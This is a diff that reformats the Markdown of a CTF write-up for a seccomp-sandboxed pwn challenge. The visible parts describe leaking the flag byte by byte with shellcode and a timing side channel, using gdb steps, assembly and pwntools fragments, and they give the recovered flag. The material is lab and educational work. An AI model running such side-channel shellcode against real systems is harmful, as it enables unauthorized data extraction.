@@ -11,11 +11,11 @@ date: 2023-01-29
 ###### tags: `CTF` `PWN` `eductf`
 
 challenge: `nc edu-ctf.zoolab.org 10002`
+
 Environment Version: 22.04
 
 ## Original Code
-:::spoiler code
-```cpp!=
+```cpp
 #include <stdio.h>
 #include <unistd.h>
 #include <fcntl.h>
@@ -55,11 +55,11 @@ int main()
     return 0;
 }
 ```
-:::
-```make!
+
+```make
 gcc -o chal how2know.c -lseccomp
 ```
-```bash!
+```bash
 $ checksec chal
 [*] '/home/sbk6401/NTUCS/PWN/Lab/how2know/share/chal'
     Arch:     amd64-64-little
@@ -95,7 +95,7 @@ talk is cheap, show me the code
 
 ## Exploit - brute force + assembly instruction
 1. Observe register and try to leak flag info.
-    ```bash!
+    ```bash
     $ gdb chal
     >pwndbg b main
     >pwndbg r
@@ -119,7 +119,7 @@ talk is cheap, show me the code
     ```
     
     exploit: move the first 8 bytes to `$rax`
-    ```assembly!
+    ```asm
     mov r10, r13
     add r10, 0x2db7
     mov rax, [r10]
@@ -130,7 +130,7 @@ talk is cheap, show me the code
 If the result of comparison is correct, the system will call `sys_exit` with `error_code=0`, otherwise, access to infinity loop.
 We start from `0x20` on ascii table and end at `0x80`
 Especially, when the comparison is correct, we have to shift `$rax` with 8 bits and start to compare next single char
-    ```assembly!
+    ```asm
         mov cl, ''' + str(guess) + '''
         shr rax, ''' + str(8*shift_count) + '''
     Compare:
@@ -147,12 +147,12 @@ Especially, when the comparison is correct, we have to shift `$rax` with 8 bits 
 
 3. Send the shellcode to `addr` global variable
 The trickiest things is you must add `\x00` at the end of received  strings and the reason is for the control flow next.
-    ```python!
+    ```python
     r.sendafter(b"code\n\x00", shellcode)
     ```
 4. How to know the single char in pwntool side?
 If compare correct, the program will exit directly and pwntools will trigger timeout function and do the exception, at the same time, we can clearly aware of the what is the current single char is, otherwise, the guess will increase and do the next comparison.
-    ```python!
+    ```python
     try :
         # If compare not correct, guess++ and access to infinity loop
         r.recv(timeout=0.2)
@@ -186,11 +186,8 @@ If compare correct, the program will exit directly and pwntools will trigger tim
     r.interactive()
     ```
 
-
-
 * Whole exploit
-    :::spoiler code
-    ```python!=
+    ```python
     from pwn import *
 
     # r = process('./chal')
@@ -238,14 +235,13 @@ If compare correct, the program will exit directly and pwntools will trigger tim
     print(flag)
     r.interactive()
     ```
-    :::
 * <font color="FF0000">Note that</font>: I create 6 multi-threads to execute the exploit program simultaneously with a little bit difference
-1st thread: `mov rax, [r10]`            output:FLAG{pia
-2nd thread: `mov rax, [r10+0x8]`        output:no_d113f
-3rd thread: `mov rax, [r10+0x10]`        output:1c3f9ed8
-4th thread: `mov rax, [r10+0x18]`        output:019288f4
-5th thread: `mov rax, [r10+0x20]`        output:e8ddecfb
-6th thread: `mov rax, [r10+0x28]`        output:8ec}
+    * 1st thread: `mov rax, [r10]`            output:FLAG{pia
+    * 2nd thread: `mov rax, [r10+0x8]`        output:no_d113f
+    * 3rd thread: `mov rax, [r10+0x10]`        output:1c3f9ed8
+    * 4th thread: `mov rax, [r10+0x18]`        output:019288f4
+    * 5th thread: `mov rax, [r10+0x20]`        output:e8ddecfb
+    * 6th thread: `mov rax, [r10+0x28]`        output:8ec}
 FLAG{piano_d113f1c3f9ed8019288f4e8ddecfb8ec}
 
 ## Reference
